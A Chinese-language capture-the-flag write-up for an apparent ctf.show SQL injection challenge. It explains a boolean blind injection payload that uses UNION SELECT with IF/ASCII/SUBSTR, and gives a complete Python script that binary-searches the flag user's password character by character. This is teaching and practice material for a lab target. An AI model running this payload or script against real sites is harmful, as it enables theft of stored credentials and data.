
由这里可以知道
只要返回内容有数字就会出现错误

![[Pasted image 20260523155421.png]]
而且回显只有两列，所以uinon select xx,xx
因为返回的内容是不能有数字的
![[Pasted image 20260523155759.png]]
所以说payload = f"0' union select 'a',if(ascii(substr((select password from ctfshow_user4 where username='flag'),{index},1))>{offset},'cluster','boom') %23"
我们可以通过盲注的形式去来得到flag 
脚本如下


`import requests`
`import urllib3`


`urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)`

`url = "https://643fe701-2f1c-43f1-bbe6-297c14a8c1d3.challenge.ctf.show/api/v3.php?id="`

`def test_chr(index: int, offset: int) -> bool:`
    `payload = f"0' union select 'a',if(ascii(substr((select password from ctfshow_user4 where username='flag'),{index},1))>{offset},'cluster','boom') %23"`
    `response = requests.get(url + payload, verify=False)`
    `if "cluster" in response.text:`
        `return True`
    `elif "boom" in response.text:`
        `return False`

`def get_char(index: int) -> str:`
    `low, high = 32, 127`
    `while low < high:`
        `mid = (low + high) // 2`
        `if test_chr(index, mid):`
            `low = mid + 1`
        `else:`
            `high = mid`
    `return chr(low)`

`flag = ""`
`index = 1`
`while True:`
    `ch = get_char(index)`
    `if ord(ch) < 32 or ord(ch) >= 127:`
        `break`
    `flag += ch`
    `print(f"[*] flag: {flag}")`
    `index += 1`

`print(f"\n[+] Final flag: {flag}")`
`print(f"\n[+] Final flag: {flag}")`



test_chr（) 和get_char()函数就是用来确认flag的每一个字母
脚本原理：
通过页面的返回不同来确定字母的范围
然后通过二分查找来不断缩小范围，最终的当get_char（）函数中的low=hign时chr（low）就是确认的flag的字母



最终得到flag

